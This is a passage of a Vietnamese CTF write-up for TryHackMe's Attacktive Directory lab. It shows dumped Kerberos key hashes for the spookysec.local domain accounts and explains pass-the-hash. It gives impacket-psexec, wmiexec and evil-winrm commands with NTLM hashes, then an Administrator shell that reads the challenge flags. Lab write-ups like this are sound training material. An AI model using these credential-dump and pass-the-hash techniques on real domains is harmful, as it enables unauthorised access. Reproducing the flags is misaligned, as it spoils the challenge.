spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:b4a4718669d995a4b50725ec4880645aa18b16102e813365055c1ffb8c249d46
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:44a8b67467af583405d616f4c272e9dc
ATTACKTIVEDIREC$:des-cbc-md5:26a1851ac2ae1675
[*] Cleaning up... 

```

<figure><img src="../.gitbook/assets/image (966).png" alt=""><figcaption></figcaption></figure>

[https://en.wikipedia.org/wiki/Pass\_the\_hash](https://en.wikipedia.org/wiki/Pass_the_hash)

<figure><img src="../.gitbook/assets/image (967).png" alt=""><figcaption></figcaption></figure>

Thông thường:

```
User -> nhập mật khẩu -> hệ thống tạo NTLM hash -> xác thực
```

Với Pass-the-Hash:

```
Kẻ tấn công có NTLM hash -> dùng trực tiếp hash đó để xác thực
```

Không cần crack hash thành mật khẩu thật.

#### Ví dụ

Giả sử bạn dump được hash của Administrator:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

Thay vì phải crack ra mật khẩu, bạn có thể dùng hash này để đăng nhập từ xa:

```
impacket-psexec administrator@10.10.10.10 \-hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

hoặc:

```
impacket-wmiexec administrator@10.10.10.10 \-hashes LMHASH:NTHASH
```

hoặc sử dụng `Evil-WinRM`

Evil-WinRM là công cụ kết nối từ xa tới máy Windows qua WinRM (cổng 5985/5986), rất phổ biến trong các bài lab AD.

Kết nối bằng mật khẩu:

```
evil-winrm -i <IP> -u <USER> -p '<PASSWORD>'
```

Ví dụ:

```
evil-winrm -i 10.10.10.5 -u administrator -p 'Password123!'
```

Kết nối bằng NTLM hash (Pass-the-Hash):

```
evil-winrm -i <IP> -u <USER> -H <NTLM_HASH>
```

Ví dụ:

```
evil-winrm -i 10.10.10.5 -u administrator -H 32ed87bdb5fdc5e9cba88547376818d4
```

Một số lệnh hữu ích sau khi vào shell:

```
upload file.exe
download C:\Users\Administrator\Desktop\flag.txt
menu
exit
```

Kiểm tra WinRM có mở không:

```
nmap -p 5985,5986 <IP>
```

Nếu thấy:

```
5985/tcp open  wsman
```

thì thường có thể dùng Evil-WinRM để đăng nhập.



<figure><img src="../.gitbook/assets/image (968).png" alt=""><figcaption></figcaption></figure>



## \[Flag Submission] Flag Submission Panel

và từ account administrator này ta có thể đọc luôn các file ở thư mục desktop của các user còn lại



```bash
└─# evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
                                      
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
TryHackMe{4ctiveD1rectoryM4st3r}
*Evil-WinRM* PS C:\Users\Administrator\Desktop>

```



```bash
Directory: C:\Users\svc-admin\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  12:18 PM             28 user.txt.txt


*Evil-WinRM* PS C:\Users\svc-admin\desktop> type user.txt.txt
TryHackMe{K3rb3r0s_Pr3_4uth}
```



```bash
*Evil-WinRM* PS C:\Users\backup\desktop> ls


    Directory: C:\Users\backup\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  12:19 PM             26 PrivEsc.txt


*Evil-WinRM* PS C:\Users\backup\desktop> type PrivEsc.txt
 
TryHackMe{B4ckM3UpSc0tty!}
```

<figure><img src="../.gitbook/assets/image (969).png" alt=""><figcaption></figcaption></figure>
